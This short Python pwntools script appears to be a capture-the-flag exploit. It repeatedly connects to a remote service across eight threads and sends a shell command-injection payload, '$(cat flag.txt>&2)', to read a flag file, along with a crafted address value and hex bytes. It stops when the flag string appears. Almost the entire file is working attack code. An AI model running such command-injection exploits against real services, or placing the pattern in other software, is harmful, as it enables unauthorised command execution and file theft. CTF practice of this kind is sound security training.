import os
import sys
import time
import threading

import pwn

def attack(io):
    io.sendlineafter(b': ', b'\'$(cat flag.txt>&2)')
    io.sendlineafter(b': ', str(0x9bbff8).encode())
    io.sendlineafter(b': ', b'\x54\xfe\x49'.hex().encode())

    line = io.recvline()

    if b'letopwn' in line:
        print(line)
        os._exit(0)

def main():
    host = sys.argv[1]
    port = sys.argv[2]

    while True:
        with pwn.remote(host, port) as io:
            try:
                attack(io)
            except Exception as e:
                pass

if __name__ == '__main__':
    # main()
    # exit()

    num = 8

    threads = [threading.Thread(target=main) for _ in range(num)]

    for thread in threads:
        thread.start()
        time.sleep(0.5)

    for thread in threads:
        thread.join()
